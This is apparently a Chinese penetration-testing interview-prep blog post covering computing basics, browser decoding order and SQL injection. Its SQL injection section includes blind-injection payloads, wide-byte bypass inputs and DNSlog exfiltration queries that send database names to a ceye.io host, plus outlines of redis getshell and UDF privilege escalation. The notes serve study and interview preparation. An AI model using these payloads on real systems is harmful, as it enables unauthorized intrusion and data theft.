toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9B%91%E6%8E%A7%E7%9A%84%E8%9C%9C%E7%BD%90%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">5.12.</span> <span class="toc-text">你监控的蜜罐是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AAip%E4%BD%A0%E4%BC%9A%E7%BB%93%E5%90%88%E5%93%AA%E4%BA%9B%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%9A%84%E6%83%85%E6%8A%A5%E8%BF%9B%E8%A1%8C%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90"><span class="toc-number">5.13.</span> <span class="toc-text">拿到一个IP，你会结合哪些平台上的情报进行溯源分析？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%8A%A0%E5%9B%BA"><span class="toc-number">5.14.</span> <span class="toc-text">Windows加固</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%8A%A0%E5%9B%BA"><span class="toc-number">5.15.</span> <span class="toc-text">Linux加固</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3"><span class="toc-number">6.</span> <span class="toc-text">漏洞相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin-getshell"><span class="toc-number">6.1.</span> <span class="toc-text">phpmyadmin getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nacos%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">6.2.</span> <span class="toc-text">nacos（信息泄露）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.3.</span> <span class="toc-text">fastjson反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.4.</span> <span class="toc-text">shiro反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.5.</span> <span class="toc-text">log4j反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95getshell"><span class="toc-number">6.6.</span> <span class="toc-text">redis漏洞如何getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.7.</span> <span class="toc-text">docker逃逸漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp"><span class="toc-number">6.8.</span> <span class="toc-text">thinkphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#drupal"><span class="toc-number">6.9.</span> <span class="toc-text">Drupal</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%A6%E8%81%94%E7%BD%91%E6%B5%8B%E8%AF%95"><span class="toc-number">7.</span> <span class="toc-text">车联网测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%B1%BB"><span class="toc-number">7.1.</span> <span class="toc-text">基础类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4%E5%87%A0%E7%A7%8D%E6%80%BB%E7%BA%BF%E4%BB%A5%E5%8F%8A%E4%BB%96%E4%BB%AC%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">7.1.1.</span> <span class="toc-text">说说几种总线以及他们的作用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can%E6%8A%A5%E6%96%87%E7%9A%84%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86"><span class="toc-number">7.1.2.</span> <span class="toc-text">CAN报文的组成部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uds%E6%9C%8D%E5%8A%A1%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">7.1.3.</span> <span class="toc-text">UDS服务有哪些</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%B1%BB"><span class="toc-number">7.2.</span> <span class="toc-text">测试类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E4%BB%80%E4%B9%88%E6%B5%8B%E8%AF%95%E9%A1%B9"><span class="toc-number">7.2.1.</span> <span class="toc-text">有什么测试项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wifi%E6%9C%89%E4%BB%80%E4%B9%88%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">7.2.2.</span> <span class="toc-text">WIFI有什么攻击面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E4%BB%80%E4%B9%88%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">7.2.3.</span> <span class="toc-text">有什么攻击面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%B9%E8%BD%A6%E8%BD%BD%E7%B3%BB%E7%BB%9F%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%92%8C%E5%97%85%E6%8E%A2%E5%88%86%E6%9E%90"><span class="toc-number">7.2.4.</span> <span class="toc-text">如何对车载系统进行端口扫描、漏洞扫描和嗅探分析？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87obd-ii%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3%E6%9C%89%E4%BB%80%E4%B9%88%E6%B5%8B%E8%AF%95can%E7%9A%84%E9%A1%B9%E7%9B%AE%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95"><span class="toc-number">7.2.5.</span> <span class="toc-text">通过OBD-II调试接口，有什么测试CAN的项目，如何测试？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95ivi%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">7.2.6.</span> <span class="toc-text">测试IVI的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8can%E5%88%B7%E5%86%99ecu%E5%92%8C%E4%BD%BF%E7%94%A8obd%E5%88%B7%E5%86%99ecu%E7%9A%84%E4%B8%8D%E5%90%8C%E5%88%B7%E5%86%99%E6%B5%81%E7%A8%8B%E5%A6%82%E4%BD%95"><span class="toc-number">7.2.7.</span> <span class="toc-text">使用CAN刷写ECU和使用OBD刷写ECU的不同？刷写流程如何？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uds%E5%88%B7%E5%86%99%E6%B5%81%E7%A8%8B"><span class="toc-number">7.2.8.</span> <span class="toc-text">UDS刷写流程</span></a></li></ol></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-面试整理" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">面试整理</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check">创建于</i> <a href="/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/" class="article-date"><time datetime="2023-08-10T01:27:17.000Z" itemprop="datePublished">2023-08-10</time> </a></span><span class="article-updated"><i class="icon icon-calendar-check">更新于</i> <a href="/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/" class="article-updated"><time datetime="2023-08-20T01:27:17.000Z" itemprop="datePublished">2023-08-20</time> </a></span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/" class="leancloud_visitors" data-flag-title="面试整理"><span class="leancloud-visitors-count">0</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 13.4k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 49(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="数据结构与算法"><a class="markdownIt-Anchor" href="#数据结构与算法"></a> 数据结构与算法</h2><h3 id="树的遍历"><a class="markdownIt-Anchor" href="#树的遍历"></a> 树的遍历</h3><p>树的一些概念：</p><ul><li><p>度：节点的度就是孩子的个数，树的度就是最大的度</p></li><li><p>深度（自上往下）、高度（自下往上）、层次（根节点为第一层，自上往下）</p></li><li><p>有序（左右孩子不可互换）、无序（可互换）</p></li><li><p>满二叉树（最后一排也是满的），平衡二叉树（任意节点的高度不超过1），完全二叉树（必须有左孩子才能有右孩子）</p></li><li><p>一些公式：</p><ul><li>总结点数 = 所有节点度的和 + 1</li><li>总结点数 = 总分支数 + 1</li><li>边 = 度 = 分支数</li><li>度为m的树中第i层至多有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m^{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.824664em"></span><span class="strut bottom" style="height:.824664em;vertical-align:0"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit">m</span><span class="vlist"><span style="top:-.363em;margin-right:.05em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord scriptstyle uncramped"><span class="mord mathit">i</span><span class="mbin">−</span><span class="mord mathrm">1</span></span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span></span></span></span>个节点</li></ul></li><li><p>遍历：</p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230913102846918.png" alt="image-20230913102846918" style="zoom:50%"><ul><li>先序（ABDEC）都可以使用递归算法（栈）</li><li>中序（DBEAC）</li><li>后序（DEBCA）</li><li>层次（ABCDE）使用队列</li></ul></li></ul><ul><li>哈夫曼树：用于压缩数据，带权路径为：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>P</mi><mi>L</mi><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi></mrow></msubsup><msub><mi>w</mi><mi>i</mi></msub><msub><mi>l</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">WPL=\sum_{i=1}^{n}w_il_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.75em"></span><span class="strut bottom" style="height:1.0500099999999999em;vertical-align:-.30001em"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:.13889em">W</span><span class="mord mathit" style="margin-right:.13889em">P</span><span class="mord mathit">L</span><span class="mrel">=</span><span class="mop"><span class="op-symbol small-op mop" style="top:-.0000050000000000050004em">∑</span><span class="vlist"><span style="top:.30001em;margin-left:0;margin-right:.05em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord scriptstyle cramped"><span class="mord mathit">i</span><span class="mrel">=</span><span class="mord mathrm">1</span></span></span></span><span style="top:-.364em;margin-right:.05em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord scriptstyle uncramped"><span class="mord mathit">n</span></span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span><span class="mord"><span class="mord mathit" style="margin-right:.02691em">w</span><span class="vlist"><span style="top:.15em;margin-right:.05em;margin-left:-.02691em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord mathit">i</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span><span class="mord"><span class="mord mathit" style="margin-right:.01968em">l</span><span class="vlist"><span style="top:.15em;margin-right:.05em;margin-left:-.01968em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord mathit">i</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span></span></span></span>。</li></ul><h3 id="排序"><a class="markdownIt-Anchor" href="#排序"></a> 排序</h3><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230913104657807.png" alt="image-20230913104657807"></p><h2 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统"></a> 操作系统</h2><h3 id="虚拟内存是什么"><a class="markdownIt-Anchor" href="#虚拟内存是什么"></a> 虚拟内存是什么？</h3><p>虚拟内存是计算机系统内存管理的一种技术。它使得应用程序认为它拥有连续的可用的内存（一个连续完整的地址空间），而实际上，它通常是被分隔成多个物理内存碎片，还有部分暂时存储在外部磁盘存储器上，在需要时进行数据交换。虚拟内存可以让程序可以拥有超过系统物理内存大小的可用内存空间。</p><p>**虚拟内存的工作原理是，当计算机的物理内存不足时，操作系统会将硬盘的一部分空间临时用作内存，**以扩展可用内存空间。这样做可以更有效地管理内存并减少出错。</p><h3 id="大端序和小端序的区别现在x64程序都是大端序还是小端序x86呢"><a class="markdownIt-Anchor" href="#大端序和小端序的区别现在x64程序都是大端序还是小端序x86呢"></a> 大端序和小端序的区别？现在X64程序都是大端序还是小端序，X86呢？</h3><p>大端序是指：高位字节存入低位置</p><p>小端序是指：低位字节存入低位置</p><p>一般都是用小端序。</p><h3 id="new出来的变量放在堆还是栈如果new出来没有free会有什么危险"><a class="markdownIt-Anchor" href="#new出来的变量放在堆还是栈如果new出来没有free会有什么危险"></a> new出来的变量放在堆还是栈？如果new出来没有free，会有什么危险？</h3><p>堆一般是存：存动态内存分配的，如果new了之后，没有free，会造成内存泄露</p><p>栈一般是存：静态/常规变量，局部变量，函数地址等</p><p>而如果有内存泄露，那么程序会一直占用该内存空间，最后导致系统因为内存不够而崩溃</p><h2 id="网络"><a class="markdownIt-Anchor" href="#网络"></a> 网络</h2><h3 id="子网掩码"><a class="markdownIt-Anchor" href="#子网掩码"></a> 子网掩码</h3><p>网络号+【子网号+主机号】</p><ul><li><p>二级IP子网掩码：网络号有多少位他就有多少位，且由连续的1和连续的0组成。例如145.13.3.10是B类，则子网掩码就为255.255.0.0</p></li><li><p>三级IP子网掩码：网络号+子网号有多少位他就有多少位例如145.13.3.10（B类），取子网掩码为255.255.255.0，则“3”则为子网号</p></li></ul><h3 id="常见的内网段有哪些他们的掩码是什么"><a class="markdownIt-Anchor" href="#常见的内网段有哪些他们的掩码是什么"></a> 常见的内网段有哪些，他们的掩码是什么</h3><ol><li><code>10.0.0.0/8 10.255.255.255/8</code></li><li><code>172.16.0.0/12 172.31.255.255/12</code></li><li><code>192.168.0.0/16 192.168.255.255/16</code></li></ol><h3 id="各个协议层osi-tcpip"><a class="markdownIt-Anchor" href="#各个协议层osi-tcpip"></a> 各个协议层OSI TCP/IP</h3><table><thead><tr><th>OSI 七层</th><th>TCP IP 五层</th><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td><strong>HTTP</strong> FTP</td><td>请求（为程序或用户提供请求服务）</td></tr><tr><td>表示层</td><td>-</td><td>LPP</td><td>编码（负责编码、加密）</td></tr><tr><td>会话层</td><td>-</td><td>SSL TLS LDAP</td><td>会话（建立会话管理）</td></tr><tr><td>传输层</td><td>传输层</td><td><strong>TCP UDP</strong></td><td>通信（建立端到端连接）</td></tr><tr><td>网络层</td><td>网络层</td><td>IP ICMP</td><td>路由（IP地址和路由选择）</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>以太网 交换机 ARP</td><td>封帧（提供访问介质和链路管理，MAC封装于此）</td></tr><tr><td>物理层</td><td>物理层</td><td>光纤 集线器</td><td>比特（连接物理媒体，实现比特流传输）</td></tr></tbody></table><h3 id="tcp三次握手-四次挥手"><a class="markdownIt-Anchor" href="#tcp三次握手-四次挥手"></a> TCP三次握手、四次挥手</h3><p>三次握手：</p><ol><li>第一次握手：客户端发送syn包(seq=x)到服务器，并进入SYN_SEND状态，等待服务器确认。</li><li>第二次握手：服务器收到syn包，必须确认客户的SYN(ack=x+1)，同时自己也发送一个SYN包(seq=y)，即SYN+ACK包，此时服务器进入SYN_RECV状态。</li><li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。</li></ol><p>四次挥手：</p><ol><li>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不会再给你发数据了。</li><li>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1。</li><li>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。</li><li>第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。</li></ol><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 id="浏览器解析顺序和解码顺序"><a class="markdownIt-Anchor" href="#浏览器解析顺序和解码顺序"></a> 浏览器解析顺序和解码顺序</h3><p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516371">https://cloud.tencent.com/developer/article/1516371</a></p><p>首先要强调是一点是：浏览器的解码顺序和解析顺序是两码事。</p><p>首先要了解我们在构造xss包的时候发生了什么：</p><ol><li>在浏览器的地址栏中输入url，发送http请求头和数据，浏览器就会对其进行<strong>解码</strong>，顺序如下，解码完成传给服务器：<ol><li>HTML解码</li><li>JS解码（所以写在script里面的HTML编码没办法解码）</li><li>URL解码</li></ol></li><li>数据包通过网络传输到达远程web服务器，服务器接收到url，<strong>分析请求头</strong>，根据它找到对应资源，经过后端代码进行处理（过滤，校验），然后给前端返回响应头和数据；</li><li>浏览器接收到响应的数据后，对数据进行<strong>解析</strong>（下面要说的事）<ol><li>浏览器解析代码的顺序是：<code>HTML代码=JS代码&gt;代码</code>，即HTML代码与JS代码属于同一级，从上向下解析（导致HTML声明的对象必须要在JS代码调用前实现）</li><li>解析html标签过程中遇到<code>&lt;script&gt;</code>标签，则暂停HTML标签解析，控制权转交给JavaScript引擎，执行完后继续解析html，js可以对DOM进行修改</li></ol></li></ol><h4 id="解析顺序"><a class="markdownIt-Anchor" href="#解析顺序"></a> 解析顺序</h4><p>主要分为两个过程：</p><ol><li><p>浏览器接收到响应数据后，解析器先对HTML之类的文档进行解析，构建成DOM节点树，同时，CSS会被CSS解析器解析生成样式表。</p></li><li><p>解析html标签过程中遇到<code>&lt;script&gt;</code>标签，则暂停HTML标签解析，控制权转交给JavaScript引擎，执行完后继续解析html，js可以对DOM进行修改。</p></li></ol><p>所以浏览器解析代码的顺序是：<code>HTML代码=JS代码&gt;代码</code>，即HTML代码与JS代码属于同一级，从上向下解析（导致HTML声明的对象必须要在JS代码调用前实现），JQuery代码则是浏览器解析完HTML代码和JS代码后才会开始解析JQuery代码。</p><h4 id="解码顺序"><a class="markdownIt-Anchor" href="#解码顺序"></a> 解码顺序</h4><p>浏览器一般的解码顺序是</p><ol><li>先进行html解码</li><li>再进行javascript解码</li><li>最后再进行url解码</li></ol><p>需要注意的是这里的url解码和我们发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p><p>明白了这个顺序，我们就可以理解<code>&lt;script&gt;alert&amp;#40;'1')&lt;/script&gt;</code>是无法弹框的，因为script标签内无法解析HTML实体编码。</p><h1 id="top10"><a class="markdownIt-Anchor" href="#top10"></a> TOP10</h1><h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/SQL%E6%B3%A8%E5%85%A5.png" alt="SQL注入"></p><h3 id="sql注入的原理-危害-修复方式以及如何发现这个是否存在sql注入"><a class="markdownIt-Anchor" href="#sql注入的原理-危害-修复方式以及如何发现这个是否存在sql注入"></a> SQL注入的原理、危害、修复方式？以及如何发现这个是否存在sql注入？</h3><p><strong>原理</strong>：由于在有用户可控参数的sql查询语句中采用了直接拼接该参数，没有做过滤或者其他防御措施</p><p><strong>危害</strong>：导致用户可以非法获取数据库中的其他信息，甚至于getshell和提权</p><p><strong>修复</strong>：采用预编译、限制输入长度、过滤关键字、同意输出</p><p>**判断：**输入<code>1' and 1=1/2 --+</code>查看是否出现错误页面，或者观察是否有延迟，输入单引号查看是否有报错等</p><h3 id="mybatis预编译是怎么做的怎么绕过预编译"><a class="markdownIt-Anchor" href="#mybatis预编译是怎么做的怎么绕过预编译"></a> Mybatis预编译是怎么做的？怎么绕过预编译？</h3><p><strong>Mybatis的预编译</strong>采用：<code>#&#123;&#125;</code>，注意：<code>$&#123;&#125;</code>不是预编译，而只是单纯的拼接。</p><p><strong>参数化查询</strong>：即使用<code>?</code>，代替参数，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... <span class="type">where</span> <span class="variable">name</span> <span class="operator">=</span> ?<span class="number">1</span>; query.setParameter(<span class="number">1</span>, parameter);</span><br></pre></td></tr></table></figure><p><strong>预编译CASE注入</strong>：<strong>例如SQL语句中order by 后面的参数无法使用预编译赋值</strong>。此时应严格检验用户输入的参数类型、参数格式等是否符合程序预期要求。所以会存在 <strong>绕过</strong>：</p><blockquote><p><strong>通过case when语句可以将order by后的orderExpression表达式中添加select语句</strong></p></blockquote><h3 id="时间型盲注和布尔型盲注有什么区别吗怎么写脚本"><a class="markdownIt-Anchor" href="#时间型盲注和布尔型盲注有什么区别吗怎么写脚本"></a> 时间型盲注和布尔型盲注有什么区别吗？怎么写脚本？</h3><p>布尔型盲注可以通过返回页面的成功与否判断所猜测的字符是否正确。而时间型盲注返回的页面都是一样的，通过是否成功执行sleep函数来判断猜测字符是否正确。他们的编写逻辑都是一样的：</p><p>首先判断数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substr((select @@database), 1, 1)=&#x27;</span>a<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> @<span class="variable">@database</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><h3 id="过滤逗号的sql注入如何绕过limit"><a class="markdownIt-Anchor" href="#过滤逗号的sql注入如何绕过limit"></a> 过滤逗号的SQL注入如何绕过（limit）</h3><p>使用from或者offset，具体来说</p><ol><li>如果是过滤limit后的逗号，可以使用offset来替换，例如：<code>select * from user where id &gt; 2 limit 2 offset 3</code>，等价于：<code>limit 3, 2</code>，即以下标3为开始，输出两个。</li><li>如果是过滤substr，mid等盲注需要的函数，则可使用from for代替，例如：<code>-1' and substr((select name from user where id = 1 limit 1 offset 0) from 1 for 2)</code>，相当于<code>substr(~, 1, 2)</code></li><li>其他的还可以用<code>like</code>和<code>join</code>代替（也就是不使用mid等函数，直接等于正则）。</li></ol><h3 id="redis未授权漏洞的利用方法"><a class="markdownIt-Anchor" href="#redis未授权漏洞的利用方法"></a> redis未授权漏洞的利用方法</h3><p>都是ROOT权限</p><ol><li><p>写ssh公钥</p></li><li><p>写计划任务/var/spool/cron，反弹shell</p></li><li><p>写webshell</p><p>得知道绝对路径</p></li><li><p>主从复制getshell</p><blockquote><p>主从复制是为了缓解数据库压力，使用两个数据库，一个读一个写，分担流量压力。在redis 4.x到5.x间，可以如此操作：</p><p>将自己设为主机，将受害这设为从机，自己编写一个.so恶意文件，使用FULLRESYNC（实际上使用工具Redis-RCE）加载到从机上运行so，即可get反弹shell</p></blockquote></li></ol><h3 id="单引号被过滤了怎么办"><a class="markdownIt-Anchor" href="#单引号被过滤了怎么办"></a> 单引号被过滤了怎么办</h3><ol><li>采用url编码：%27</li><li>使用括号</li></ol><h3 id="mysql一个和两个"><a class="markdownIt-Anchor" href="#mysql一个和两个"></a> mysql一个@和两个@@</h3><p>一个是用户自定义变量，两个是系统变量</p><h3 id="sleep被禁止后怎么进行sql注入"><a class="markdownIt-Anchor" href="#sleep被禁止后怎么进行sql注入"></a> sleep被禁止后怎么进行sql注入</h3><p>等价替代函数：benchmark，get_lock函数</p><h3 id="sql注入无回显的情况下利用dnslogmysql下利用什么构造代码mssql下又如何"><a class="markdownIt-Anchor" href="#sql注入无回显的情况下利用dnslogmysql下利用什么构造代码mssql下又如何"></a> sql注入无回显的情况下，利用DNSlog，mysql下利用什么构造代码？mssql下又如何？</h3><p>无回显一般有两种解决思路：</p><ol><li><p>DNSlog外带</p><p>把注入代码写到请求中，读取DNS解析日志即可</p></li><li><p>盲注（时间和布尔）</p><p>需要写脚本，多次请求所以容易被封IP，需要使用代理池</p></li></ol><p>代码构造：</p><ol><li><p>mysql利用load_file：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.xxx.cey e.io\abc&#x27;</span>))),<span class="number">1</span>,<span class="number">0</span>)#</span><br></pre></td></tr></table></figure></li><li><p>mssql利用master…xp_dirtree以及堆叠注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @ hostvarchar(<span class="number">1024</span>);<span class="keyword">SELECT</span> @ host<span class="operator">=</span>(SELECTdb_name())<span class="operator">+</span><span class="string">&#x27;.xxx.ceye.io&#x27;</span>;<span class="keyword">EXEC</span>(<span class="string">&#x27;master..xp_dirtree&quot;&#x27;</span><span class="operator">+</span><span class="variable">@host</span><span class="operator">+</span><span class="string">&#x27;\foobar$&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol><h3 id="宽字节注入漏洞原理-利用方式及修复方案"><a class="markdownIt-Anchor" href="#宽字节注入漏洞原理-利用方式及修复方案"></a> 宽字节注入漏洞原理、利用方式及修复方案</h3><p>原理：</p><ul><li>在mysql中使用了gbk编码，占用两个字节，而mysql的一个特性是GBK多字节编码，它会认为两个字节就代表一个汉字</li><li>注：GB2312不存在此问题，取值范围不同</li></ul><p>利用：</p><ul><li><p>%df时候会和转义符\（即%5c）进行结合，所以单引号就逃逸了出来</p><p>注：我们不仅只是能输入%df ，我们只要输入的数据的ASCII码大于128就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1%df&#x27;</span><br><span class="line"># GPC转义</span><br><span class="line">id=1%df\&#x27;</span><br><span class="line">id=1%df%5c&#x27;</span><br><span class="line">id=1運&#x27;</span><br></pre></td></tr></table></figure></li></ul><p>修复方案：</p><ol><li>预编译，参数化查询</li><li>使用mysql_real_escape_string代替addslshes函数对用户输入进行转义</li><li>调用mysql_set_charset函数，声明为gbk</li></ol><h3 id="udf提权有没有了解过"><a class="markdownIt-Anchor" href="#udf提权有没有了解过"></a> UDF提权有没有了解过</h3><p>UDF允许用户加载自定义的功能函数，而由于该UDF函数可以动态加载，则我们可以将恶意UDF文件上传到数据库，放在指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下），执行我们的函数（例如给find赋权，通过suid提权，或者写个反弹shell也可以）。</p><h3 id="如何突破注入时字符被转义"><a class="markdownIt-Anchor" href="#如何突破注入时字符被转义"></a> 如何突破注入时字符被转义？</h3><ul><li><p>宽字符注入</p></li><li><p>hex编码绕过</p></li></ul><h3 id="sqlmap自带脚本你知道哪些"><a class="markdownIt-Anchor" href="#sqlmap自带脚本你知道哪些"></a> sqlmap自带脚本你知道哪些</h3><ol><li><a target="_blank" rel="noopener" href="http://apostrophemask.py">apostrophemask.py</a> ：将引号替换为UTF-8,用于过滤单引号。</li><li><a target="_blank" rel="noopener" href="http://base64encode.py">base64encode.py</a> :替换为base64编码。</li><li><a target="_blank" rel="noopener" href="http://multiplespaces.py">multiplespaces.py</a>:围绕SQL关键字添加多个空格。</li><li><a target="_blank" rel="noopener" href="http://space2plus.py">space2plus.py</a>:用+号替换为空格</li></ol><p>也可以自己写tamper</p><h3 id="sqlmap中os-shell的原理及利用条件"><a class="markdownIt-Anchor" 